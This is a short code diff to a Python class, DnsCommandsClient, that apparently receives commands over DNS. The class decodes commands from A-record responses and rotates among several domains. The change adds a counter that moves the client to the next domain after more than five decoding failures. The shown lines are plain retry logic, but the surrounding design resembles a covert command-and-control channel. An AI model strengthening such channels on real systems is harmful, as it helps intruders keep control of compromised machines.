@@ -107,12 +107,14 @@ class DnsCommandsClient(Thread):
         self.nonce = random.randrange(0, 1<<32-1)
         self.poll = 60
         self.active = True
+        self.failed = 0
 
         Thread.__init__(self)
 
     def next(self):
         self.domain_id = ( self.domain_id + 1 ) % len(self.domains)
         self.domain = self.domains[self.domain_id]
+        self.failed = 0
 
     def _a_page_decoder(self, addresses, nonce, symmetric=None):
         if symmetric is None:
@@ -181,6 +183,8 @@ class DnsCommandsClient(Thread):
             response = Parcel.unpack(
                 self._a_page_decoder(addresses, nonce)
             )
+
+            self.failed = 0
         except ParcelInvalidCrc:
             logging.error('CRC FAILED / Fallback to Public-key decoding')
 
@@ -193,11 +197,25 @@ class DnsCommandsClient(Thread):
                 self.encoder.kex_reset()
 
             except ParcelInvalidCrc:
-                logging.error('CRC FAILED / Fallback failed also / CRC')
+                logging.error(
+                    'CRC FAILED / Fallback failed also / CRC / {}/{}'.format(
+                        self.failed, 5
+                    )
+                )
+                self.failed += 1
+                if self.failed > 5:
+                    self.next()
                 return []
 
             except ParcelInvalidPayload:
-                logging.error('CRC FAILED / Fallback failed also / Invalid payload')
+                logging.error(
+                    'CRC FAILED / Fallback failed also / Invalid payload / {}/{}'.format(
+                        self.failed, 5
+                    )
+                )
+                self.failed += 1
+                if self.failed > 5:
+                    self.next()
                 return []
 
         return response.commands
